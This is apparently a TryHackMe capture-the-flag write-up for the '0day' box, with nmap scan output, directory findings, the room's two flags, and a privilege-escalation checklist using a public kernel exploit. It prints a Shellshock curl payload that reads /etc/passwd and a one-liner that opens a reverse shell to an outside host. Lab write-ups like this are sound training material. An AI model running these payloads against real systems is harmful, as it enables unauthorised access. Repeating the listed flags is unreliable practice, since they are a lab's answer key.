TryHackMe.com

Box = 0day

export IP=10.10.105.5

# NMAP SCANS

```
Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-11 13:36 GMT
Nmap scan report for ip-10-10-105-5.eu-west-1.compute.internal (10.10.105.5)
Host is up (0.00043s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (EdDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
MAC Address: 02:4C:3C:34:AA:CD (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/11%OT=22%CT=1%CU=30841%PV=Y%DS=1%DC=D%G=Y%M=024C3C%T
OS:M=5FFC546A%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=I%TS=8
OS:)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M2
OS:301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11
OS:)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W
OS:=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms ip-10-10-105-5.eu-west-1.compute.internal (10.10.105.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.25 seconds

```
# INTERESTING FINDS

```
  using gobuster:
        - /secret shows an image of a cute turtle.
        - /robots.txt has a text: You really thought it'd be this easy?
        - /backup has an encrypted ssh private key.
        - /cgi-bin has forbidden access and test.cgi file in it.
  trying for shellshock vulnerability: (exploit-CVE-2014-6271)
        - command used: (curl -H "user-agent: () { :; }; echo; echo; /bin/sh -c 'cat /etc/passwd'" \
http://10.10.105.5/cgi-bin/test.cgi)
        - exploit above returned result by showing contents of /etc/passwd file.
        - got a reverse shell by using curl command:(curl -A "() { :; }; /bin/bash -i > /dev/tcp/10.10.48.30/9000 0<&1 2>&1" http://10.10.105.5/cgi-bin/test.cgi)
```

# TASKS

1. user.txt?

- THM{Sh3llSh0ck_r0ckz}


2. root.txt?

- THM{g00d_j0b_0day_is_Pleased}


# PRIVILEGE ESCALATION

Method used:

* uname -a (shows ubuntu version: 3.13.0 which is vulnerable to local privilege escalation)
* searchsploit Ubuntu 3.13.0
* copy 37292.c via wget in a directory that has write access for everyone
* compile the .c code using the command: (gcc [FILE_NAME] -o [OUTPUT_FILENAME])
* then make sure the PATH is set to:(export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
* run the exploit (./[FILE_NAME])
* now you are root user! 